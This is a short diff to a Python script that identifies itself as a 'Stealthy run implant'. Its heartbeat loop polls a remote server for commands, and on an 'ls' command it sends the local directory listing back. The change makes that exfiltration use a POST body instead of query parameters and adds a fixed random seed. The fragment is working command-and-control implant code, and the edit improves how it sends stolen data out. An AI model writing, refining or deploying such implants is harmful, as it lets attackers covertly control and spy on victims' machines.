@@ -45,7 +45,7 @@ def send_heartbeat(stop_event):
                 res = requests.get(url="http://"+server_ip + build_uri(".png"), params={})
                 stop_event.set()
             elif "ls" in res.text:
-                res = requests.post(url="http://" + server_ip + build_uri(""), params={"data":f'{listdir(".")}'.encode()})
+                res = requests.post(url="http://" + server_ip + build_uri(""), data={"data":f'{listdir(".")}'.encode()})
         sleep(.5)
 
 
@@ -54,6 +54,8 @@ def send_heartbeat(stop_event):
 
 if __name__ == "__main__":
     print("Stealthy run implant")
+
+    random.seed(42)
 
     processes = [send_heartbeat]
     threads = list()
